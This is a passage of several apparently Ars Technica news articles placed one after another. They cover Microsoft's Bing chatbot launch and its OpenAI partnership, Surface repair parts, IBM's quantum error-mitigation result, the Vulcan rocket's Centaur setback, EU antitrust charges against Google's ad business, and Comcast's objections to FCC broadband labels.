<p>In a <a href="https://www.wired.com/story/microsofts-satya-nadella-is-betting-everything-on-ai/">Wired interview</a> published today, Microsoft CEO Satya Nadella suggested that any hiccups with Sydney at first were just part of Microsoft's plan for training the chatbot to respond to real-world prompts that couldn't be tested in a lab.</p>
<p>"We did not launch Sydney with GPT-4 the first day I saw it, because we had to do a lot of work to build a safety harness," Nadella told Wired. "But we also knew we couldn't do all the alignment in the lab. To align an AI model with the world, you have to align it in the world and not in some simulation."</p>
<p>So that's partly why Microsoft rushed ahead anyway, but sources told WSJ that the rush was also partly due to Microsoft executives who had "misgivings about the timing of ChatGPT’s launch last fall."</p>
<p>Because OpenAI started ChatGPT's public testing while Microsoft was still working on integrating OpenAI tech into Bing, tension seemingly spiked between the partners, who also stood as rivals in an AI race to capture the world's attention.</p>
<p>As ChatGPT's success grew, some Microsoft employees raised concerns that ChatGPT was stealing Bing's "thunder," WSJ reported. Others sensibly posited that Microsoft could learn valuable lessons ahead of Bing's rollout from ChatGPT's early public testing. While Microsoft watched its partner grow ever more popular by the minute, it's easy to see why the company placed more urgency on AI-powered Bing's release. Public interest in the technology was there, and Microsoft wanted to be a bigger part of the conversation.</p>
<p>Of course, ChatGPT ultimately won the AI race, instantly attracting the <a href="https://arstechnica.com/information-technology/2023/02/chatgpt-sets-record-for-fastest-growing-user-base-in-history-report-says/">fastest-growing user base in history</a>. Meanwhile, "the new Bing," released a month later, "has yet to come close to the breakout success of ChatGPT," WSJ reported. Citing data from analytics firm YipitData, WSJ reported that ChatGPT "has nearly double the average number of daily search sessions as Bing search does." YipitData reported that ChatGPT has reached 200 million monthly users, while <a href="https://arstechnica.com/gadgets/2023/03/ai-powered-chat-helps-bing-make-a-small-dent-in-googles-search-hegemony/">Bing hit 100 million daily active users</a> in March.</p>
<p><a href="https://arstechnica.com/information-technology/2023/04/why-ai-chatbots-are-the-ultimate-bs-machines-and-how-people-hope-to-fix-them/4/">ChatGPT and Bing were later criticized</a> for launching chatbots guilty of making up stuff, lying, and other issues that many users didn't expect to encounter. OpenAI is still looking for ways to limit chatbots' so-called "hallucinations," <a href="https://www.cnbc.com/2023/05/31/openai-is-pursuing-a-new-way-to-fight-ai-hallucinations.html">CNBC reported</a> in May. In February, Microsoft had to <a href="https://arstechnica.com/information-technology/2023/02/microsoft-lobotomized-ai-powered-bing-chat-and-its-fans-arent-happy/">update Bing to limit long conversations </a>until the company could find a better solution. Even after working on the issue for months, though, <a href="https://www.theverge.com/2023/6/13/23759348/openai-microsoft-bing-ai-warning-gpt-4">The Verge reported</a> that—while Bing may respond with fewer unhinged outbursts during long conversations—"it still often gets things wrong."</p>
<p>Nadella told Wired that Microsoft has found "very practical stuff that reduces hallucination" and that seemingly serves as a stopgap until the technology improves and new solutions emerge.</p>
<p>Nadella also said that sometimes "hallucinations" are desirable, though, and any solutions to limit "hallucinations" should be mindful that users should maintain the option to use AI chatbots for creative purposes, too.</p>
<p>OpenAI did not immediately respond to Ars' request to comment. A Microsoft spokesperson told Ars that another reason why the company launched the new Bing preview was to respond to half of all standard web searches that typically go unanswered. Microsoft is also continually seeking to improve the authority and credibility of the web results that underpin their chat mode response, the spokesperson said, and stands prepared to quickly fix unanticipated issues that arise.</p>
<p>"Our approach is to make AI tools available to people responsibly with guardrails in place so we can get feedback, continue to learn, and quickly improve these tools, as we have done with Bing," Microsoft's spokesperson told Ars.</p>
<div><a name='page-2'></a></div>
<h2>The rivalry goes beyond chatbots</h2>
<p>When Wired asked Nadella why Microsoft invested in OpenAI when it has been investing in its own large language model for decades, Nadella said that he could see that "OpenAI was going after the same thing as" Microsoft. Rather than "trying to train five different foundational models" at the same time, Nadella saw an opportunity to partner with OpenAI to make "one foundation" where the two independent companies could "go after one goal, with discipline."</p>
<p>"We said, 'Let's go after this and build one thing that really captures the imagination of the world,'” Nadella told Wired.</p>
<p>But WSJ reported that the partnership is much more complicated than that.</p>
<p>Further tension and confusion has brewed within Microsoft's in-house AI team, which has "complained about diminished spending." Most employees are set back by a lack of "access to the inner workings" of OpenAI's technology, which is particularly painful for employees attempting to integrate that tech into various Microsoft products. There's also the awkward reality that OpenAI's and Microsoft's sales teams "sometimes pitch the same customers." Much of this "drama" amounts to typical infighting that happens any time two companies pair up, WSJ reported, but there's no ignoring the conflict inherent to both sides attempting to maintain independence while reaping maximum profits by selling access to the same technology.</p>
<p>Despite these tensions, Nadella told Wired that OpenAI "bet on" Microsoft, and Microsoft "bet on" OpenAI. He still envisions "a good commercial partnership" between the independent companies and considered Microsoft's investment in OpenAI as "a long-term stable deal."</p>
<p>Increasingly, it looks like one way to assuage tension is to bring the companies even closer together in partnership. WSJ noted that Nadella announced last month that the Bing search engine would soon be integrated into ChatGPT, which he said was "just the start of what we plan to do with our partners in OpenAI to bring the best of Bing to the ChatGPT experience."</p>

<p>Microsoft offers <a href="https://www.microsoft.com/en-us/download/100440">first-party service manuals</a> for several generations' worth of Surface hardware, in keeping with a commitment to improve its repairability and sustainability efforts. Today, Microsoft is <a href="https://blogs.windows.com/devices/2023/06/14/announcing-the-availability-of-consumer-replacement-components-for-surface-devices/">taking the next step</a>, listing <a href="https://www.microsoft.com/en-us/store/b/surface-repair-parts">dozens of replacement parts</a> for Surface tablets, laptops, and all-in-ones on the Microsoft Store.</p>

<p>The screens, kickstands, batteries, keyboards, camera modules, and other odds and ends are available for the Surface Pro 8, 9, and X; Surface Laptops 2 through 5 plus the Go 2 and the Studio; and the Studio and Studio 2+ all-in-one desktops. Most of the major components are pretty expensive—the display for a Surface Studio 2+ is $1,750 all by itself—but they're cheaper than buying a new device, you won't have to pay for labor costs, and you can be sure you're getting genuine first-party components.</p>
<p>"When purchasing a replacement component, you will receive the part and relevant collateral components (such as screws if applicable)," wrote Microsoft VP Tim McGuiggan. "Tools needed for the repair are sold separately through iFixit. It is essential to follow the instructions in the applicable Microsoft Service Guide or article."</p>
<p>Microsoft is also selling some first-party Surface SSD upgrades for anyone who bought a 128GB or 256GB drive and regretted it later. But the way they're listed is a bit odd—there are three separate listings for the <a href="https://www.microsoft.com/en-us/d/replacement-ssd-for-surface-pro-8/8zr1w52nbmgj">Surface Pro 8</a>, <a href="https://www.microsoft.com/en-us/d/replacement-ssd-for-surface-pro-9/8xpxwj7pqc0x">Surface Pro 9</a>, and <a href="https://www.microsoft.com/en-us/d/replacement-ssd-for-surface-pro-x/8rq55htc5x41">Surface Pro X</a>, plus more for various generations of Surface Laptop and Surface Laptop Go. And though all of the drives are physically identical, the ones for the more recent Surface devices are a bit more expensive than the others in some capacities.</p>
<p>The drives may differ in subtle ways that the listings don't mention—differing PCI Express configurations, maybe, or just making sure that drives are replaced with identical models for support purposes. It's worth noting that there are mixed reviews for <a href="https://arstechnica.com/gadgets/2023/01/its-getting-easier-to-buy-bigger-ssds-for-the-steam-deck-and-surface-pcs/">third-party M.2 2230 drives</a> like the <a rel="nofollow" href="http://www.amazon.com/dp/B0BQG6FM45/?tag=arstech20-20">Sabrent Rocket</a> in Surface devices; many users report that they work just fine, and others report instability, overheating, and sleep issues. Though Microsoft's drives cost more per gigabyte than Sabrent's, and none of them go up to 2TB, it's nice to have a first-party option available to minimize these kinds of issues.</p>
<p>The first few generations of Surface devices were infamously difficult to repair, with proprietary parts and glued-together frames that earned the company <a href="https://arstechnica.com/gadgets/2013/02/ifixit-teardown-shows-surface-pro-is-a-tough-nut-to-crack/">some very low scores on iFixit's repairability scale</a>. More recent versions have been better, partly because of <a href="https://arstechnica.com/gadgets/2021/10/microsoft-is-evaluating-right-to-repair-options-for-xbox-and-surface-devices/">pressure from Microsoft shareholders</a> to improve repairability and sustainability, and partly because a handful of <a href="https://arstechnica.com/gadgets/2023/03/tech-makers-must-provide-repairs-for-up-to-10-years-under-proposed-eu-law/">countries</a> and <a href="https://arstechnica.com/gadgets/2022/12/weakened-right-to-repair-bill-is-signed-into-law-by-new-yorks-governor/">US states</a> are beginning to propose and pass right-to-repair laws that would mandate some of these changes anyway.</p>
<p>Parts will initially be available in the US, Canada, and France, with "updates on additional markets" coming "in the future."</p>

<div><a name='page-1'></a></div>
<p>Today's quantum processors are error-prone. While the probabilities are small—less than 1 percent in many cases—each operation we perform on each qubit, including basic things like reading its state, has a significant error rate. If we try an operation that needs a lot of qubits, or a lot of operations on a smaller number of qubits, then errors become inevitable.</p>
<p>Long term, the plan is to solve that using <a href="https://arstechnica.com/science/2023/02/google-shows-current-generation-qubits-good-enough-for-error-correction/">error-corrected qubits</a>. But these will require multiple high-quality qubits for every bit of information, meaning we'll need thousands of qubits that are better than anything we can currently make. Given that we probably won't reach that point until the next decade at the earliest, it raises the question of whether quantum computers can do anything interesting in the meantime.</p>
<p>In a publication in today's Nature, IBM researchers make a strong case for the answer to that being yes. Using a technique termed "error mitigation," they managed to overcome the problems with today's qubits and produce an accurate result despite the noise in the system. And they did so in a way that clearly outperformed similar calculations on classical computers.</p>
<h2>Living with noise</h2>
<p>If we think of quantum error correction as a way to avoid the noise that keeps qubits from accurately performing operations, error mitigation can be viewed as accepting that the noise is inevitable. It's a means of measuring the typical errors, compensating for them after the fact and producing an estimate of the real result that's hidden within the noise.</p>
<p>An early method of performing error mitigation (termed probabilistic error cancellation) involved sampling the behavior of the quantum processor to develop a model of the typical noise and then subtracting the noise from the measured output of an actual calculation. But as the number of qubits involved in the calculation goes up, this method gets a bit impractical to use—you have to do too much sampling.</p>
<p>So instead, the researchers turned to a method where they intentionally amplified and then measured the processor's noise at different levels. These measurements are used to estimate a function that produces similar output as the actual measurements. That function can then have its noise set to zero to produce an estimate of what the processor would do without any noise at all.</p>
<p>To test this system, the researchers turned to what's called an Ising model, which is easiest to think of as a grid of electrons where each electron's spin influences that of its neighbors. As you step forward in time, each step sees the spins change in response to the influence of their neighbors, which alters the overall state of the grid. The new configuration of spins will then influence each other, and the process will repeat as time progresses.</p>
<p>While an Ising model involves simplified, idealized behavior, it has features that show up in a variety of physical systems, so they've been studied pretty widely. (D-Wave, which makes quantum annealers, recently published a paper in which its hardware <a href="https://arstechnica.com/science/2023/04/quantum-effects-of-d-waves-hardware-boosts-its-performance/">identified the ground state</a> of these systems, so they may sound familiar.) And as the number of objects in the model increases, their behavior quickly becomes complex enough that classical computers struggle to calculate their state.</p>
<p>It's possible to perform the calculations on a quantum computer by performing operations on pairs of qubits. To simplify matters, IBM used an Ising model where the grid was configured in a way that coincides with the physical arrangement of qubits on its processor. But this wasn't a case where the processor was simply being used to model its own behavior; as mentioned above, Ising models existed independently of quantum hardware.</p>
<div><a name='page-2'></a></div>
<h2>Quantum vs. classical</h2>
<p>To start with, the researchers limited the number of spins they were modeling to ensure that its behavior could be calculated on a traditional computer. This work showed that the error mitigation procedure worked; once the noise was compensated for, the numbers from the quantum calculation matched those from the classical computation, even out to over a dozen time steps. But it was relatively simple to scale up the model to where the classical computer (a 64-core processor with 128GB of memory) started to struggle.</p>
<p>This happened at the point where the system required 68 qubits to model. From there, the researchers used software that estimated the system's behavior on the classical computer, which allowed it to keep up for longer at the cost of some accuracy. Even so, it was possible to scale up the model's size to where 127 qubits were needed, which is well past the point where classical calculations can keep up.</p>
<p>"The mitigation technique was basically able to run for a larger size than I could do an exact simulation on a classical computer using an exact classical method simulation," IBM's <a href="https://researcher.watson.ibm.com/researcher/view.php?person=us-jay.gambetta">Jay Gambetta</a> told Ars. "So it's outside the reach of exact classical methods. But then in classical methods, you also have approximate methods that can scale more efficiently. [The quantum calculation] was also more accurate than those approximate classical methods."</p>
<p>The researchers estimate that tracing the system's behavior through 20 time steps would require over 400 petabytes of memory.</p>
<p>So, this appears to be a clear case of quantum computers outperforming classical computers on a potentially interesting problem. And Gambetta suggested that showing noise mitigation works on a simple system like the Ising model is essential if we're going to start applying the approach to more complicated problems that could have practical applications. But pushing things further isn't going to simply be a matter of adding more qubits.</p>
<h2>The complications</h2>
<p>IBM has <a href="https://arstechnica.com/science/2022/11/ibm-pushes-qubit-count-over-400-with-new-processor/">a quantum processor with over 400 qubits</a>, so why limit things to the 127 qubits used here? There are a couple of reasons for this. IBM chose its smaller, 127-qubit Eagle processor for the work because that has already reached Revision 3, while its larger Osprey processor is still in its first iteration. The two revisions have been used to improve the performance of the qubits, cutting down on the noise that needs to be compensated for.</p>
<p>And that brings us to the second reason: compensating for noise is computationally expensive and needs to be done using classical computers. Doing the sampling of the noise on the quantum computer only took about five minutes. But even for a smaller problem, the full noise mitigation process required four hours; that's compared to eight hours to simply model the system on a classical computer. Still, the scaling was better; a somewhat larger problem required about 30 hours to model, while the noise mitigation took 9.5 hours.</p>
<p>One consequence of this means that adding enough qubits can also potentially make error mitigation computationally intractable. "Error mitigation still scales exponentially," Gambetta said, "but it's a weaker exponential than the simulation cost."</p>
<p>But IBM thinks that there are two reasons for optimism here. For starters, the research team says the algorithms involved in the error mitigation are "dominated by classical processing delays that stand to be largely eliminated through conceptually straightforward optimizations." So there's likely to be a speedup there. The second is that the time involved scales as a function of the error rates in the quantum hardware—lower those, and it will speed up the classical portion of the calculation.</p>
<p>Gambetta is especially excited about a processor called Heron, which is on IBM's road map for this year. Regarding speed-of-gate operations, Gambetta said, "Our preliminary results suggest that [Heron will] be somewhere like five times better than Eagle." Since the possibility that the system suffers decoherence (the loss of its quantum state) is a function of time, less time on operations means that the calculation is more likely to be completed before decoherence becomes an issue. And fewer errors also means a faster error mitigation process.</p>
<p>All of this makes people at IBM optimistic that error mitigation is a route toward performing useful calculations on quantum hardware long before we reach the point where error-corrected qubits are possible. As the paper concludes, "A noisy quantum processor, even before the advent of fault-tolerant quantum computing, produces reliable expectation values at a scale beyond 100 qubits and non-trivial circuit depth leads to the conclusion that there is indeed merit to pursuing research towards deriving a practical computational advantage from noise-limited quantum circuits."</p>

<div><a name='page-1'></a></div>
<p>The Vulcan rocket took a critical step toward its much-anticipated debut launch last week with a successful engine-firing test. However, one critical issue remains unresolved before the large booster can lift off.</p>
<p>This final hurdle involves modifications to the rocket's Centaur V upper stage, <a href="https://arstechnica.com/science/2023/04/ula-continues-investigation-of-centaur-stage-anomaly/">which exploded</a> during a test at the end of March. On Tuesday, the chief executive of Vulcan manufacturer United Launch Alliance, Tory Bruno, <a href="https://twitter.com/torybruno/status/1668314430785097728">wrote on Twitter</a> that a root cause of the failure had been identified, and the investigation has been concluded.</p>
<p>As part of their recent updates, neither Bruno nor United Launch Alliance established a new target launch date. Two sources indicated to Ars, however, that this flight likely would not occur before the fourth quarter of this year due to additional needed work.</p>
<h2>Flight readiness firing</h2>
<p>United Launch Alliance completed an essential milestone on June 7 when it conducted a hot-fire test of Vulcan's first-stage engines. The BE-4 engines, built by Blue Origin, began the ignition sequence at T-4.88 seconds and, according to the company, throttled up to the target power level for two seconds before powering down.</p>
<p>Although the company needs to fully review data from the test, it appeared to be a complete success. This long-awaited firing of the main engines closes what had been believed to be the biggest outstanding issue with the rocket prior to its debut launch—before the Centaur anomaly occurred. Delivery of the BE-4 engines had been delayed for several years while Blue Origin completed its development and testing.</p>
<p>"The team is reviewing the data from the systems involved in today’s test and, in parallel, continue with the Centaur V test stand anomaly investigation," the company said in a statement after the test firing. "Pending the data review and the investigation results, we will develop a launch plan. Testing is an integral part of our launch vehicle development program, and we will fly when we believe it is safe to launch."</p>
<h2>Centaur update</h2>
<p>In replies on Twitter Tuesday, Bruno provided the first public confirmation that the United Launch Alliance's investigation into the Centaur failure is complete. Although the report is not public, it appears that the hydrogen tank failed during a pressure test at Marshall Space Flight Center in Alabama.</p>

<p>"The super thin, high performance steel skin needs to be a little thicker near the top of the dome," <a href="https://twitter.com/torybruno/status/1668571711061610496">Bruno said</a>, adding, "Working corrective action and retest."</p>
<p>This comment implies that a Centaur qualification tank will be made more robust and then undergo pressure testing at Marshall later this summer. It is unclear whether the flight version of the Centaur stage, which had already been delivered to the launch site in Cape Canaveral, Florida, will also need to be modified. If so, this testing and modification work will likely take a few months.</p>
<p>Asked whether the flight tank needed to be modified, Bruno replied cryptically, <a href="https://twitter.com/torybruno/status/1668571711061610496">saying</a>, "Working on all of that now."</p>
<h2>Space Force is keeping tabs</h2>
<p>Throughout all of this, United Launch Alliance has been working closely with the US Space Force, which has been the company's most important customer since ULA's inception nearly two decades ago.</p>
<p>In 2020, as part of its "National Security Space Launch Phase 2" program, <a href="https://www.af.mil/News/Article-Display/Article/2305576/space-force-awards-national-security-space-launch-phase-2-launch-service-contra/">the US military awarded</a> United Launch Alliance and SpaceX five-year contracts to launch about 40 missions between fiscal year 2022 and 2028. As part of this program, United Launch Alliance won 60 percent of the launches, and SpaceX got 40 percent.</p>
<p>However, there have been growing concerns about the readiness of Vulcan, which was supposed to start launching national security missions in 2022. That will now not happen until at least 2024 because Vulcan must fly two "certification" flights before it is deemed safe enough for valuable reconnaissance satellites.</p>
<p>Notably, in <a href="https://www.ssc.spaceforce.mil/Portals/3/Documents/PRESS%20RELEASES/Space%20Systems%20Command%20assigns%20missions%20for%20National%20Security%20Space%20Launch%20Phase%202%20FY23%20Order%20Year.pdf?ver=FN1MZufLWN99U7m3cM0XPQ%3D%3D">an announcement last Friday</a>, Space Systems Command said it recently assigned a dozen Phase 2 missions to the two launch companies. These launches were split equally between United Launch Alliance and SpaceX rather than in a 60-40 split.</p>
<p>Additionally, just last week, a US Government Accountability Office <a href="https://www.gao.gov/assets/gao-23-106059.pdf">report</a> mentioned that delays were causing military officials working on the Phase 2 launch program to consider their options. "In the event that Vulcan is unavailable for future missions, program officials stated that the Phase 2 contract allows for the ability to reassign missions to the other provider," the report states.</p>

<div><a name='page-1'></a></div>
<p>Google may soon be ordered to break up its lucrative ad business, which amounted to <a href="https://www.statista.com/statistics/266249/advertising-revenue-of-google/">nearly $225 billion</a> in 2022 and represented nearly 80 percent of Google's total revenue. Today, <a href="https://arstechnica.com/tech-policy/2023/06/googles-ad-tech-dominance-spurs-more-antitrust-charges-report-says/">as expected</a>, the European Commission (EC) sent Google a statement of objections, detailing ad tech antitrust charges and explaining exactly why the EC thinks that breaking up Google's ad business may be the only acceptable remedy.</p>
<p>"We are concerned that Google may have illegally distorted competition in the online advertising technology industry," Margrethe Vestager, the EC's executive vice president, said in <a href="https://ec.europa.eu/commission/presscorner/detail/en/speech_23_3288">remarks</a> published today.</p>
<p>According to Vestager, an EC investigation launched in 2021 found that Google may have favored its own ad tech services when serving as an intermediary ad exchange, matching advertiser supply and publisher demand for advertising space online.</p>
<p>To the EC, it seems like Google has its hand in too many pots to be trusted to conduct business fairly. Google operates an ad exchange, AdX, as well as ad tech services for advertisers—Google Ads and Google Display &amp; Video 360 (DV 360)—and services for publishers, DoubleClick For Publishers (DFP).</p>
<p>Vestager said there's potential for misconduct because "Google may hold a dominant position on both ends of the ad tech supply chain" and "appears to have abused its market position" by ensuring that both advertising and publisher services allegedly favored AdX over other ad exchanges when matching advertisers and publishers.</p>
<p>By allegedly favoring AdX, Vestager said that Google was able to charge "a high fee for its 'exchange' services."</p>
<p>Two examples she provided show Google's seeming self-preferencing conduct that has led the EC to expect that Google breaking up its ad business may be the only path forward for the ad tech industry to remain fair.</p>
<p>First, when DFP selects ads for publishers, it is supposed to find ads that "bring the most value to them" by auctioning off the online placement to advertisers who place bids in a "sealed bid auction." This means that each advertiser supposedly had no prior knowledge of how other advertisers were bidding. However, the EC found that Google was allegedly "allowing Google's own participant in that auction, AdX, to open the sealed envelopes of all other rivals before placing its own bid." This allegedly gave AdX an unfair advantage to beat out competitors for DFP placements.</p>
<p>The second scenario the EC pointed to as being potentially problematic focuses on Google Ads practices. When advertisers buy Google Ads, the expectation, the EC suggested, is that Google would place bids on as many ad exchanges as possible to get the highest distribution for ads. That wasn't what Google was doing, the EC alleged. Instead, Google was allegedly only—or "almost only"—placing bids on its own exchange, AdX. This practice, the EC alleged, "make[s] AdX the most attractive marketplace" and "gave it a significant competitive advantage over rival ad exchanges."</p>
<p>These are only two examples of Google's alleged self-preferencing in its ad tech business. Vestager said there are "a number of similar" other examples that concerned the EC.</p>
<p>"We see the risk that Google's conduct distorted competition among ad exchanges: rather than letting the best of the ad exchanges win the race, the helping hand of the powerful Google ecosystem gave Google's own exchange a unique head start over all other rivals in the industry," Vestager said.</p>
<p>Because of this, "AdX could afford to keep its commissions high without losing its advertisers," Vestager said.</p>
<div><a name='page-2'></a></div>
<h2>Solution: Break up Google’s ad business</h2>
<p>While investigating Google's ad business, the EC consulted with competition authorities within the European Union—in France, Denmark, Italy, and Portugal—as well as those beyond, in the United Kingdom and the United States. In particular, the EC's cooperation with the US Department of Justice "has been close and fruitful," Vestager said, and the parties share "the same view as to what is good for competition, and ultimately, how to best remedy the issues for the benefit of consumers and citizens."</p>
<p>This level of cooperation could indicate that ad tech antitrust probes outside of the EU could draw the same conclusions as the EC once the EC concludes its probe. And that could be a big problem for Google, which is financially motivated to thwart a potential break-up order to keep its ad tech business operating as usual.</p>
<p>If the EC is able to prove that Google's ad tech business operated illegally, Vestager said that Google couldn't be trusted to change its behaviors.</p>
<p>"This market is a highly technical market," Vestager said. "It is very dynamic. The detection of these behaviors can therefore be very challenging. We have seen this play out concretely: each time a practice was detected by the industry, Google subtly modified its behavior so as to make it more difficult to detect but with the same objectives, with the same effects."</p>
<p>Instead of trusting Google to change its behavior and risking Google continuing self-preferencing misconduct, "just under a different disguise," Vestager said that Google would need to break up its business to mollify anti-competitive concerns.</p>
<p>That could mean that Google could be forced to "divest part of its services," Vestager said. If Google sold its sell-side services—including both publisher services through DFP and its ad exchange AdX— that would likely "put an end to the conflicts of interest" allegedly uncovered by the EC's investigation.</p>
<p>Google received the EC's full statement of objections today and now has a chance to respond to allegations. The EC's media contact Sara Simonini told Ars that "there is no legal deadline for bringing an antitrust investigation to an end."</p>
<p>"The duration of an antitrust investigation depends on a number of factors, including the complexity of the case, the extent to which the companies concerned cooperate with the Commission, and the exercise of their rights of defense," Simonini told Ars.</p>
<p>Google now has the option of exercising its rights of defense and will have access to the EC's file detailing the alleged misconduct. Once Google receives that file, the company will have 11 weeks to respond in writing to the EC's statement of objections, or it can ask for a deadline extension or an oral hearing "conducted by an independent Hearing Officer," Simonini told Ars.</p>
<p>Google did not immediately respond to Ars' request for comment. [<strong>Update, 4:28 pm ET:</strong> Google's ad tech revenue was roughly a fifth of the size of its search revenue in the <a href="https://abc.xyz/investor/static/pdf/2023Q1_alphabet_earnings_release.pdf?cache=0924ccf">first quarter of 2023. </a>Search revenue comprises the bulk of Google's ad revenue and is not a focus of the EC's probe. Google's VP of Global Ads, Dan Taylor, provided a statement to Ars, confirming that Google disagreed "with the EC's view" on its ad tech business and plans to "respond accordingly."</p>
<p>“Our advertising technology tools help websites and apps fund their content, and enable businesses of all sizes to effectively reach new customers," Taylor said. "Google remains committed to creating value for our publisher and advertiser partners in this highly competitive sector. The Commission’s investigation focuses on a narrow aspect of our advertising business and is not new."]</p>

<p>Comcast is not happy about new federal rules that will require it to provide broadband customers with labels displaying exact <a href="https://arstechnica.com/tech-policy/2022/01/fcc-aims-to-stop-broadband-bill-shock-reviving-plan-nixed-by-ajit-pai/">prices and other information</a> about Internet service plans.<div class="image shortcode-img right medium"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fcc-broadband-label.jpg"><img alt='Broadband label that ISPs will be required to display to consumers at the point of sale.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fcc-broadband-label-300x699.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fcc-broadband-label-640x1492.jpg 2x" alt='Broadband label that ISPs will be required to display to consumers at the point of sale.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fcc-broadband-label.jpg"class="caption-link" rel="nofollow">Broadband label that ISPs will be required to display to consumers at the point of sale.</a> (credit: FCC)</p></div></p>
<p>In a <a href="https://www.fcc.gov/ecfs/document/10608230225212/1">filing</a> last week, Comcast told the Federal Communications Commission that it is "working diligently to put in place the systems and processes necessary to create, maintain, and display the labels as required." But according to Comcast, "two aspects of the Commission's Order impose significant administrative burdens and unnecessary complexity in complying with the broadband label requirements."</p>
<p>Comcast noted that five major cable and telecom industry trade groups <a href="https://www.fcc.gov/ecfs/document/10117331109471/1">petitioned the FCC</a> in January to change the rules. Comcast's new filing urged the FCC to grant the petition "as soon as possible before the rules become effective to help providers streamline and simplify their labeling processes, which will ultimately benefit consumers."</p>
<p>The FCC was required to implement broadband label rules in a <a href="https://arstechnica.com/tech-policy/2021/11/congress-oks-42-billion-to-deploy-100mbps-broadband-in-unserved-areas/">2021 law</a> passed by Congress. Although the FCC <a href="https://www.fcc.gov/document/fcc-requires-broadband-providers-display-labels-help-consumers">approved</a> the label rules in November 2022, it's not clear when they will take effect. They are subject to a federal Office of Management and Budget (OMB) review because of requirements in the US Paperwork Reduction Act. Medium-sized and large ISPs would be required to comply six months after the OMB review, while providers with 100,000 or fewer subscribers would have one year to comply.</p>
<p>"The label hasn't even reached consumers yet, but Comcast is already trying to create loopholes. This request would allow the big ISPs to continue hiding the true cost of service and frustrating customers with poor service. Congress created the label to end these practices, not maintain them, and Comcast offers no compelling reason for the FCC to violate Congress' intent," Joshua Stager, policy director at media advocacy group Free Press, told Ars. Stager previously <a href="https://arstechnica.com/tech-policy/2021/03/obama-era-fccs-broadband-nutrition-labels-could-make-a-comeback/">advocated</a> for the broadband labels when he was deputy director of New America's Open Technology Institute.</p>
<p>The FCC rules require ISPs to display the labels at the point of sale. The labels must disclose broadband prices, introductory rates, data allowances, Internet speeds, and include links to information about an ISP's network management practices and privacy policies.<!--adbreak--></p>
<h2>Comcast doesn’t want to list all monthly fees</h2>
<p>Comcast pointed to "recent filings regarding the Commission's underestimation of the burdens associated with implementing the broadband consumer label rules." Those filings came from Verizon, AT&amp;T, Lumen (aka CenturyLink), and a trade group representing rural broadband providers.</p>
<p>Comcast and other ISPs have annoyed customers for many years by advertising low prices and then charging much bigger monthly bills by tacking on a variety of fees. While some of these fees are related to government-issued requirements and others are not, poorly trained customer service reps have been known to <a href="https://arstechnica.com/tech-policy/2019/01/the-lies-comcast-allegedly-told-customers-to-hide-full-cost-of-service/">falsely tell customers</a> that fees created by Comcast are mandated by the government.</p>
<p>The FCC rules will force ISPs to accurately describe fees in labels given to customers, but Comcast said it wants the FCC to rescind a requirement related to "fees that ISPs may, but are not obligated to, pass through to customers." These include state Universal Service fees and other local fees.</p>
<p>As Comcast makes clear, it isn't required to pass these costs on to customers in the form of separate fees. Comcast could stop charging the fees and raise its advertised prices by the corresponding amount to more accurately convey its actual prices to customers. Instead, Comcast wants the FCC to change the rule so that it can continue charging the fees without itemizing them.</p>
<p>The portion of the FCC order that Comcast and other ISPs object to says that "providers must list all recurring monthly fees," including "all charges that providers impose at their discretion, <em>i.e.</em>, charges not mandated by a government."</p>
<p>Comcast wrote:</p>
<blockquote><p>[T]he Order appropriately refrains from requiring ISPs to itemize state and local taxes, recognizing that they "often vary according to a customer's geographic location." The Order adopts the same treatment for government fees that a "relevant state or local government 'mandate[s]'" must be passed through to customers... However, the Order appears to take a different tack with respect to fees that ISPs may, but are not obligated to, pass through to customers. The language of the Order creates much uncertainty over how ISPs must treat these fees on their labels because it may be read to require ISPs to itemize each of these pass-through government-imposed fees on their labels... If these fees must be itemized, a separate label must be created for each unique combination of applicable nonmandatory pass-through government fees. Itemizing these fees would substantially increase the burden on providers to generate and maintain their labels, particularly as the fees are subject to change, in some cases as often as quarterly.</p></blockquote>
<div><a name='page-2'></a></div>
<h2>FCC urged to reject loopholes</h2>
<p>Comcast said the FCC should let providers "list state and local government fees on labels the same way they list state and local taxes" or at least "permit the listing of the maximum amount of fees that may apply."</p>
<p>Even if Comcast's wish is granted, the cable company said it would still have to "create 251 separate broadband consumer labels to comply with the rules." Comcast's filing also specifies the number of labels it would have to create if the FCC declines to change the rules, but that number is redacted in the publicly available version of Comcast's submission.</p>
<p>Harold Feld, senior VP of consumer advocacy group Public Knowledge, said the FCC rules should remain unchanged.</p>
<p>"These rules are important for informing consumers about the basis for the cost of broadband and to ensure that ISPs comply with the rules," Feld told Ars. "In other words, they do exactly what the statute instructed. The reasons given to change these rules were not compelling when the trade associations filed their petition for reconsideration, and they have not become more compelling now."</p>
<p>The FCC, Feld said, "should reject the request to create loopholes which would obscure what fees providers decide to pass on versus those that are mandated by state law. It is an effort to pass blame to the state which properly belongs to the ISP."</p>
<h2>Documenting compliance</h2>
<p>Secondly, Comcast objects to a record-keeping requirement that seems designed to ensure that ISPs are following the rules. The record-keeping rule relates to providing labels through "alternate sales channels" such as retail stores or customer service phone calls. The FCC said that ISPs can meet the label requirement in these sales channels either by providing a hard copy of the label or by "directing the consumer to the specific web page on which the label appears by, for example, providing Internet access in the retail location or giving the customer a card with the printed URL or a QR code, or orally providing information from the label to the consumer over the phone."</p>
<p>ISPs that don't provide hard copies in those sales channels must document each instance in which they direct a consumer to a label. Essentially, ISPs must be able to prove that they pointed each consumer to the label.<!--adbreak--></p>
<p>Providers that don't provide hard copies of the label in the alternate sales channels "shall document each instance when it directs a consumer to a label at an alternate sales channel and retain such documentation for two years," the FCC rule says.</p>
<p>Comcast told the FCC that ISPs shouldn't have to collect these records. Comcast said that due to the "number of customer interactions in Comcast retail stores and over the phone," maintaining these "otherwise-unnecessary records imposes substantial additional burdens." Comcast urged the FCC to "act quickly to clarify that ISPs may comply with the Order's requirement by simply documenting their practices and procedures for displaying the label at alternate sales channels."</p>
<h2>Advocates wanted stricter rules</h2>
